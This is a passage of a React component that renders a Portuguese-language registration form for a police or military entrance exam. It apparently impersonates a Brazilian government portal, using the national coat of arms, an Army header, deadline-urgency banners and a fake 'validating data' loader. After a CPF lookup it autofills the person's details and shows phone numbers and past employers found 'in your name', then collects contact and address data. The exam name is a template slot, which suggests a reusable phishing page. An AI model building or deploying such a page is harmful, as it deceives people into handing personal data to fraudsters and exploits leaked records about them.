                  <span style={{ fontSize: 10, fontWeight: 700, color: '#1351b4', letterSpacing: '0.05em', textTransform: 'uppercase' }}>EM CURSO</span>
                )}
              </div>
            );
          })}
        </div>

        {/* Rodapé */}
        <div style={{ padding: '10px 24px 14px', borderTop: '1px solid #e5e7eb' }}>
          <p style={{ fontSize: 11, color: '#9ca3af', textAlign: 'center', margin: 0 }}>
            Por favor, não feche esta janela · Etapa {Math.min(completedCount + 1, validationSteps.length)} de {validationSteps.length}
          </p>
        </div>
      </div>
    </div>
    );
  };

  return (
    <div className="min-h-screen" style={{ backgroundColor: '#f5f7fa', position: 'relative', overflow: 'hidden' }}>
      {/* Fundo diagonal com Brasão da República */}
      <div style={{
        position: 'fixed',
        inset: 0,
        overflow: 'hidden',
        opacity: 0.08,
        pointerEvents: 'none',
        zIndex: 0,
      }}>
        <div style={{
          position: 'absolute',
          top: '-50%',
          left: '-50%',
          width: '200%',
          height: '200%',
          display: 'grid',
          gridTemplateColumns: 'repeat(6, 140px)',
          gridAutoRows: '90px',
          columnGap: '90px',
          rowGap: '70px',
          justifyContent: 'center',
          alignContent: 'center',
          transform: 'rotate(-20deg) scale(1.6)',
        }}>
          {Array.from({ length: 72 }).map((_, i) => (
            <img key={i} src={brasaoUrl} alt="" style={{ width: '100px', height: 'auto', objectFit: 'contain' }} />
          ))}
        </div>
      </div>

      <div style={{ position: 'relative', zIndex: 1 }}>
      <ExercitoHeader customTitle={sigla} customSubtitle={`${editalSlug} — Inscrições`} />
      
      {showLoader && <ValidationLoader />}
      
      <div className="container mx-auto px-4 py-6 sm:py-8">
        <Card className="max-w-2xl mx-auto shadow-lg border-0">
          <CardHeader className="text-center px-4 sm:px-6 py-6">
            <div className="flex justify-center mb-4">
              <img
                src={brasaoUrl}
                alt="Brasão"
                style={{ height: 88, objectFit: 'contain' }}
              />
            </div>
            <CardTitle className="text-xl sm:text-2xl font-bold" style={{ color: '#1351b4' }}>
              Inscrição — {editalSlug}
            </CardTitle>
            <CardDescription className="text-sm sm:text-base mt-2">
              Identifique-se para fazer a inscrição
            </CardDescription>
          </CardHeader>
          
          {/* Informações do Processo */}
          <div className="px-4 sm:px-6 pb-4">
            <div className="bg-gray-50 rounded-lg p-4 mb-6">
              <p className="text-sm text-gray-700 mb-2">
                Inscrição para o <strong>{editalSlug}</strong> — {nomeCorpo}.
              </p>
              <p className="text-xs text-gray-500">
                Preencha todas as informações com precisão. Os dados serão verificados conforme as diretrizes do {editalSlug}.
              </p>
            </div>
            <div className="border-l-4 border-amber-500 bg-amber-50 rounded p-3 mb-6">
              <p className="text-xs text-amber-800">
                <strong>Prazo de inscrição em andamento.</strong> Conclua seu cadastro agora para dar continuidade ao seu processo de inscrição no {editalSlug} antes do encerramento do período.
              </p>
            </div>
          </div>
          
          <CardContent className="px-4 sm:px-6 pb-6">
            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit, onInvalidSubmit)} className="space-y-5 sm:space-y-6">
                
                {/* CPF */}
                <FormField
                  control={form.control}
                  name="cpf"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-base font-medium">CPF *</FormLabel>
                      <div className="relative">
                        <FormControl>
                          <Input
                            {...field}
                            placeholder="000.000.000-00"
                            maxLength={14}
                            type="text"
                            inputMode="numeric"
                            data-field="cpf"
                            className="h-12 text-base border-2 border-gray-300 focus:border-[#0063AF] focus:ring-[#0063AF] rounded-lg pr-12"
                            onChange={(e) => {
                              const formatted = formatCpf(e.target.value);
                              field.onChange(formatted);
                              // Reset validation state when CPF changes
                              if (cpfValidated) {
                                setCpfValidated(false);
                                setAutoFilledData(null);
                              }
                            }}
                          />
                        </FormControl>
                        {isValidatingCpf && (
                          <Loader2 className="absolute right-3 top-1/2 transform -translate-y-1/2 h-5 w-5 animate-spin text-[#0063AF]" />
                        )}
                        {cpfValidated && (
                          <CheckCircle className="absolute right-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-green-600" />
                        )}
                      </div>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                {/* Nome Completo */}
                <FormField
                  control={form.control}
                  name="nomeCompleto"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-base font-medium">Nome Completo *</FormLabel>
                      <FormControl>
                        <Input 
                          {...field} 
                          placeholder="Seu nome completo" 
                          className="h-12 text-base border-2 border-gray-300 focus:border-[#0063AF] focus:ring-[#0063AF] rounded-lg"
                          type="text"
                          inputMode="text"
                          autoComplete="name"
                        />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                {/* Data de Aniversário */}
                <FormField
                  control={form.control}
                  name="dataAniversario"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-base font-medium">Data de Nascimento *</FormLabel>
                      <FormControl>
                        <Input 
                          {...field} 
                          type="date" 
                          inputMode="none"
                          className="h-12 text-base border-2 border-gray-300 focus:border-[#0063AF] focus:ring-[#0063AF] rounded-lg"
                          style={{ 
                            colorScheme: 'light',
                            WebkitAppearance: 'none',
                            MozAppearance: 'textfield'
                          }}
                        />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                {/* Validação de Idade */}
                {ageValidated && candidateAge !== null && (
                  <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                    <CheckCircle style={{ width: 14, height: 14, color: '#268744', flexShrink: 0 }} />
                    <span style={{ fontSize: 12, color: '#268744', fontWeight: 600, fontFamily: 'Rawline, Arial, sans-serif' }}>
                      {showWomenPriority ? 'Apta' : 'Apto'} — {candidateAge} anos, dentro dos critérios do edital
                    </span>
                  </div>
                )}

                {/* Gênero */}
                <FormField
                  control={form.control}
                  name="genero"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-base font-medium">Gênero *</FormLabel>
                      <Select onValueChange={field.onChange} value={field.value}>
                        <FormControl>
                          <SelectTrigger className="h-12 text-base border-2 border-gray-300 focus:border-[#0063AF] focus:ring-[#0063AF] rounded-lg">
                            <SelectValue placeholder="Selecione seu gênero" className="text-gray-500" />
                          </SelectTrigger>
                        </FormControl>
                        <SelectContent className="bg-white border-2 border-gray-200 rounded-lg shadow-lg">
                          <SelectItem value="masculino" className="h-12 text-base hover:bg-gray-50 cursor-pointer">
                            Masculino
                          </SelectItem>
                          <SelectItem value="feminino" className="h-12 text-base hover:bg-gray-50 cursor-pointer">
                            Feminino
                          </SelectItem>
                          <SelectItem value="outro" className="h-12 text-base hover:bg-gray-50 cursor-pointer">
                            Outro
                          </SelectItem>
                        </SelectContent>
                      </Select>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                {/* Informações de Prioridade Feminina */}
                {showWomenPriority && (
                  <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-2">
                    <div className="flex items-center space-x-2 mb-2">
                      <div className="w-2 h-2 bg-blue-600 rounded-full"></div>
                      <h4 className="font-medium text-blue-800 text-sm">
                        Candidatura Feminina — {sigla}
                      </h4>
                    </div>
                    <p className="text-xs text-blue-700 leading-relaxed">
                      <strong>Vagas abertas para mulheres</strong> em ambos os cargos do concurso: Soldado de 2ª Classe PM (nível médio) e Aspirante-a-Oficial PM (nível superior). O edital garante igualdade de condições e oportunidades para candidatas femininas em todas as etapas do processo seletivo.
                    </p>
                    <div className="mt-2 pt-2 border-t border-blue-200">
                      <p className="text-xs text-blue-700 font-medium">
                        Critérios de seleção iguais para todos os gêneros conforme {editalSlug}
                      </p>
                    </div>
                  </div>
                )}

                {/* Telefone */}
                <FormField
                  control={form.control}
                  name="telefone"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-base font-medium">Telefone *</FormLabel>
                      <div className="relative">
                        <FormControl>
                          <Input
                            {...field}
                            placeholder="(00) 00000-0000"
                            maxLength={15}
                            type="tel"
                            inputMode="numeric"
                            autoComplete="off"
                            className="h-12 text-base border-2 border-gray-300 focus:border-[#0063AF] focus:ring-[#0063AF] rounded-lg"
                            onChange={(e) => {
                              const formatted = formatPhone(e.target.value);
                              field.onChange(formatted);
                              
                              // Gerar sugestões de telefone
                              const suggestions = generatePhoneSuggestions(e.target.value);
                              setPhoneSuggestions(suggestions);
                              setShowPhoneSuggestions(suggestions.length > 0);
                              setSelectedPhoneSuggestionIndex(-1);
                            }}
                            onKeyDown={(e) => handlePhoneKeyDown(e, field)}
                            onBlur={() => {
                              // Pequeno delay para permitir click nas sugestões
                              setTimeout(() => {
                                setShowPhoneSuggestions(false);
                                setSelectedPhoneSuggestionIndex(-1);
                              }, 150);
                            }}
                            onFocus={() => {
                              if (phoneSuggestions.length > 0) {
                                setShowPhoneSuggestions(true);
                              }
                            }}
                          />
                        </FormControl>
                        
                        {/* Lista de sugestões de telefone */}
                        {showPhoneSuggestions && phoneSuggestions.length > 0 && (
                          <div className="absolute top-full left-0 right-0 z-50 bg-white border-2 border-gray-200 rounded-lg shadow-lg mt-1 max-h-48 overflow-y-auto">
                            {phoneSuggestions.map((phone, index) => {
                              const operatorLogo = getOperatorLogo(phone.operadora);
                              
                              return (
                                <button
                                  key={`${phone.numero}-${index}`}
                                  type="button"
                                  className={`w-full text-left px-4 py-3 text-base hover:bg-gray-50 border-b border-gray-100 last:border-b-0 transition-colors ${
                                    index === selectedPhoneSuggestionIndex ? 'bg-[#0063AF] text-white' : 'text-gray-700'
                                  }`}
                                  onClick={() => selectPhoneSuggestion(phone, field)}
                                  onMouseEnter={() => setSelectedPhoneSuggestionIndex(index)}
                                >
                                  <div className="flex items-center justify-between">
                                    <div className="flex flex-col">
                                      <span className="font-medium">{phone.numero_formatado}</span>
                                      <span className={`text-xs ${
                                        index === selectedPhoneSuggestionIndex ? 'text-blue-100' : 'text-gray-500'
                                      }`}>
                                        {phone.tipo === 'celular' ? 'Celular' : 'Fixo'} {phone.operadora !== "DESCONHECIDA" && phone.operadora !== "Não informado" && phone.operadora !== "DESCONHECIDO" && `• ${phone.operadora}`} 
                                      </span>
                                    </div>
                                    {operatorLogo && phone.operadora !== "DESCONHECIDA" && phone.operadora !== "Não informado" && phone.operadora !== "DESCONHECIDO"  && (
                                      <img 
                                        src={operatorLogo} 
                                        alt={phone.operadora}
                                        className="h-6 w-auto opacity-80"
                                      />
                                    )}
                                  </div>
                                </button>
                              );
                            })}
                          </div>
                        )}
                      </div>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                {/* Email */}
                <FormField
                  control={form.control}
                  name="email"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-base font-medium">E-mail *</FormLabel>
                      <div className="relative">
                        <FormControl>
                          <Input 
                            {...field}
                            ref={emailInputRef}
                            type="email" 
                            placeholder="seu@email.com" 
                            className="h-12 text-base border-2 border-gray-300 focus:border-[#0063AF] focus:ring-[#0063AF] rounded-lg"
                            autoComplete="off"
                            inputMode="email"
                            onChange={(e) => {
                              const value = e.target.value;
                              field.onChange(value);
                              
                              // Gerar sugestões quando digitar @
                              const suggestions = generateEmailSuggestions(value);
                              setEmailSuggestions(suggestions);
                              setShowEmailSuggestions(suggestions.length > 0);
                              setSelectedSuggestionIndex(-1);
                            }}
                            onKeyDown={(e) => handleEmailKeyDown(e, field)}
                            onBlur={() => {
                              // Pequeno delay para permitir click nas sugestões
                              setTimeout(() => {
                                setShowEmailSuggestions(false);
                                setSelectedSuggestionIndex(-1);
                              }, 150);
                            }}
                            onFocus={() => {
                              if (emailSuggestions.length > 0) {
                                setShowEmailSuggestions(true);
                              }
                            }}
                          />
                        </FormControl>
                        
                        {/* Lista de sugestões */}
                        {showEmailSuggestions && emailSuggestions.length > 0 && (
                          <div className="absolute top-full left-0 right-0 z-50 bg-white border-2 border-gray-200 rounded-lg shadow-lg mt-1 max-h-48 overflow-y-auto">
                            {emailSuggestions.map((suggestion, index) => (
                              <button
                                key={suggestion}
                                type="button"
                                className={`w-full text-left px-4 py-3 text-base hover:bg-gray-50 border-b border-gray-100 last:border-b-0 transition-colors ${
                                  index === selectedSuggestionIndex ? 'bg-[#0063AF] text-white' : 'text-gray-700'
                                }`}
                                onClick={() => selectEmailSuggestion(suggestion, field)}
                                onMouseEnter={() => setSelectedSuggestionIndex(index)}
                              >
                                {suggestion}
                              </button>
                            ))}
                          </div>
                        )}
                      </div>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                {/* Seção de Experiências Anteriores */}
                {empregosAntigos.length > 0 && (
                  <div className="border-t-2 border-gray-100 pt-6 mt-8">
                    <div className="border-l-4 border-blue-600 bg-gray-50 p-5 mb-6">
                      <div className="flex items-center space-x-3 mb-4">
                        <CheckCircle className="w-5 h-5 text-green-600" />
                        <h3 className="text-lg font-semibold text-gray-900">
                          Experiências Anteriores Encontradas
                        </h3>
                      </div>
                      
                      <p className="text-sm text-gray-700 mb-4">
                        Encontramos experiências anteriores no seu nome nas seguintes empresas:
                      </p>
                      
                      <div className="space-y-2 mb-4">
                        {empregosAntigos.map((empresa, index) => (
                          <div key={index} className="flex items-center space-x-3 text-sm">
                            <div className="w-2 h-2 bg-blue-600 rounded-full"></div>
                            <span className="font-medium text-gray-800">{empresa}</span>
                          </div>
                        ))}
                      </div>
                      
                      <div className="bg-blue-600 text-white p-3 rounded">
                        <p className="text-xs font-medium">
                          Seu histórico profissional foi registrado e fará parte do seu dossiê de inscrição, conforme exigência do edital.
                        </p>
                      </div>
                    </div>
                  </div>
                )}

                {/* Seção de Endereço */}
                <div className="border-t-2 border-gray-100 pt-6 mt-8">
                  <h3 className="text-lg font-semibold mb-2" style={{ color: '#0063AF' }}>
                    Endereço Residencial
                  </h3>
                  <p className="text-sm text-gray-600 mb-4">
                    Informe seu endereço residencial completo. Essas informações são necessárias para o processo de verificação de antecedentes exigido pelo edital.
                  </p>
                  <div className="space-y-5">
                    
                    {/* CEP */}
                    <FormField
                      control={form.control}
                      name="cep"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel className="text-base font-medium">CEP *</FormLabel>
                          <div className="relative">
                            <FormControl>
                              <Input
                                {...field}
                                placeholder="00000-000"
                                maxLength={9}
                                type="text"
                                inputMode="numeric"
                                className="h-12 text-base border-2 border-gray-300 focus:border-[#0063AF] focus:ring-[#0063AF] rounded-lg pr-12"
                                onChange={(e) => {
                                  const formatted = formatCep(e.target.value);
                                  field.onChange(formatted);
                                  // Reset validation state when CEP changes
                                  if (cepValidated) {
                                    setCepValidated(false);
                                    setShowLocaisInfo(false);
                                  }
                                }}
                              />
                            </FormControl>
                            {isValidatingCep && (
                              <Loader2 className="absolute right-3 top-1/2 transform -translate-y-1/2 h-5 w-5 animate-spin text-[#0063AF]" />
                            )}
                            {cepValidated && (
                              <CheckCircle className="absolute right-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-green-600" />
                            )}
                          </div>
                          <FormMessage />
                        </FormItem>
                      )}
                    />

                    {/* Logradouro e Número */}
                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                      <div className="sm:col-span-2">
                        <FormField
                          control={form.control}
                          name="logradouro"
                          render={({ field }) => (
                            <FormItem>
                              <FormLabel className="text-base font-medium">Logradouro *</FormLabel>
                              <FormControl>
                                <Input 
                                  {...field} 
                                  placeholder="Rua, Avenida, etc." 
                                  inputMode="text"
                                  className="h-12 text-base border-2 border-gray-300 focus:border-[#0063AF] focus:ring-[#0063AF] rounded-lg"
                                />
                              </FormControl>
                              <FormMessage />
                            </FormItem>
                          )}
                        />
                      </div>
                      <div>
                        <FormField
                          control={form.control}
                          name="numero"
                          render={({ field }) => (
                            <FormItem>
                              <FormLabel className="text-base font-medium">Número *</FormLabel>
                              <FormControl>
                                <Input 
                                  {...field} 
                                  placeholder="123" 
                                  inputMode="numeric"
                                  className="h-12 text-base border-2 border-gray-300 focus:border-[#0063AF] focus:ring-[#0063AF] rounded-lg"
                                />
                              </FormControl>
                              <FormMessage />
                            </FormItem>
                          )}
                        />
                      </div>
                    </div>

                    {/* Complemento */}
                    <FormField
                      control={form.control}
                      name="complemento"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel className="text-base font-medium">Complemento</FormLabel>
                          <FormControl>
                            <Input 
                              {...field} 
                              placeholder="Apartamento, bloco, casa, etc. (opcional)" 
                              inputMode="text"
                              className="h-12 text-base border-2 border-gray-300 focus:border-[#0063AF] focus:ring-[#0063AF] rounded-lg"
                            />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />

                    {/* Bairro, Cidade e UF */}
                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                      <div>
                        <FormField
                          control={form.control}
                          name="bairro"
                          render={({ field }) => (
                            <FormItem>
                              <FormLabel className="text-base font-medium">Bairro *</FormLabel>
                              <FormControl>
                                <Input 
                                  {...field} 
                                  placeholder="Bairro" 
                                  inputMode="text"
                                  className="h-12 text-base border-2 border-gray-300 focus:border-[#0063AF] focus:ring-[#0063AF] rounded-lg"
                                />
                              </FormControl>
                              <FormMessage />
                            </FormItem>
                          )}
                        />
                      </div>
                      <div>
                        <FormField
                          control={form.control}
                          name="cidade"
                          render={({ field }) => (
                            <FormItem>
                              <FormLabel className="text-base font-medium">Cidade *</FormLabel>
                              <FormControl>
                                <Input 
                                  {...field} 
                                  placeholder="Cidade" 
                                  inputMode="text"
                                  className="h-12 text-base border-2 border-gray-300 focus:border-[#0063AF] focus:ring-[#0063AF] rounded-lg"
                                />
                              </FormControl>
                              <FormMessage />
                            </FormItem>
                          )}
                        />
                      </div>
                      <div>
                        <FormField
                          control={form.control}
                          name="uf"
                          render={({ field }) => (
                            <FormItem>
                              <FormLabel className="text-base font-medium">UF *</FormLabel>
                              <FormControl>
                                <Input 
                                  {...field} 
                                  placeholder="SP" 
                                  maxLength={2}
                                  inputMode="text"
                                  className="h-12 text-base border-2 border-gray-300 focus:border-[#0063AF] focus:ring-[#0063AF] rounded-lg uppercase"
                                  onChange={(e) => field.onChange(e.target.value.toUpperCase())}
                                />
                              </FormControl>
                              <FormMessage />
                            </FormItem>
                          )}
                        />
                      </div>
                    </div>
                  </div>
                </div>

                {/* Informações sobre locais de prova */}
                {showLocaisInfo && locaisProva.length > 0 && (
                  <div className="mt-6 p-4 bg-blue-50 border-2 border-blue-200 rounded-lg">
                    <div className="flex items-start">
                      <CheckCircle className="h-5 w-5 text-blue-600 mr-3 mt-0.5 flex-shrink-0" />
                      <div>
                        <h4 className="font-semibold text-blue-800 mb-2">
                          Locais de Prova Próximos
                        </h4>
                        <p className="text-sm text-blue-700 mb-3">
                          Encontramos {locaisProva.length} locais próximos ao seu endereço:
                        </p>
                        <div className="space-y-2">
                          {locaisProva.slice(0, 3).map((local, index) => (
                            <div key={index} className="text-sm text-blue-700">
                              <strong>{local.name}</strong>
                              <br />
                              <span className="text-blue-600">{local.address}</span>
                            </div>
                          ))}
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                {/* Declarações e Termos — exibe apenas após formulário preenchido */}
                {formFilled && (
                  <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
                    {[
                      {
                        id: 'term-verdadeiros',
                        checked: termVerdadeiros,
                        onChange: setTermVerdadeiros,
                        text: `Declaro que as informações prestadas são verdadeiras e completas, sob pena de eliminação do concurso.`,
                      },
                      {
                        id: 'term-lgpd',
                        checked: termLgpd,
                        onChange: setTermLgpd,
                        text: 'Estou ciente de que meus dados serão tratados conforme a LGPD — Lei nº 13.709/2018.',
                      },
                      {
                        id: 'term-edital',
                        checked: termEdital,
                        onChange: setTermEdital,
                        text: `Li e concordo com as condições do edital ${editalSlug}.`,
                      },
                    ].map(term => (
                      <label key={term.id} htmlFor={term.id} style={{ display: 'flex', alignItems: 'flex-start', gap: 9, cursor: 'pointer' }}>
                        <input
                          id={term.id}
                          type="checkbox"
                          checked={term.checked}
                          onChange={e => term.onChange(e.target.checked)}
                          style={{ width: 14, height: 14, marginTop: 2, accentColor: '#1351b4', cursor: 'pointer', flexShrink: 0 }}
                        />
                        <span style={{ fontSize: 12, color: '#6b7280', lineHeight: '1.5', fontFamily: 'Rawline, Arial, sans-serif' }}>
                          {term.text}
                        </span>
                      </label>
                    ))}
                  </div>
                )}

                {/* Botão de Confirmação */}
                <div className="pt-2">
                  <Button
                    type="submit"
                    className="w-full text-white text-sm sm:text-base transition-all duration-200 hover:opacity-90 active:scale-95"
                    style={{
                      backgroundColor: (formFilled && allTermsAccepted) ? '#1351b4' : '#9ca3af',
                      borderRadius: 0,
                      fontWeight: 700,
                      fontFamily: 'Rawline, Arial, sans-serif',
                      padding: '14px 24px',
                      height: 'auto',
                      cursor: (formFilled && allTermsAccepted) ? 'pointer' : 'not-allowed',
                    }}
                    disabled={isValidatingCpf || !formFilled || !allTermsAccepted}
                  >
                    {isValidatingCpf ? (
                      <>
                        <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                        Aguarde — validando dados...
                      </>
                    ) : (
                      submitButtonText
                    )}
                  </Button>
                </div>

                {/* Nota de rodapé */}
                <p style={{
                  fontSize: '11px',
                  color: '#9ca3af',
                  textAlign: 'center',
                  lineHeight: '1.5',
                  marginTop: '8px',
                  fontFamily: 'Rawline, Arial, sans-serif',
                }}>
                  Dados tratados conforme a LGPD — Lei nº 13.709/2018 · {editalSlug}
                </p>
              </form>
            </Form>
          </CardContent>
        </Card>
      </div>
      
      <ExercitoFooter />
      </div>
    </div>
  );
}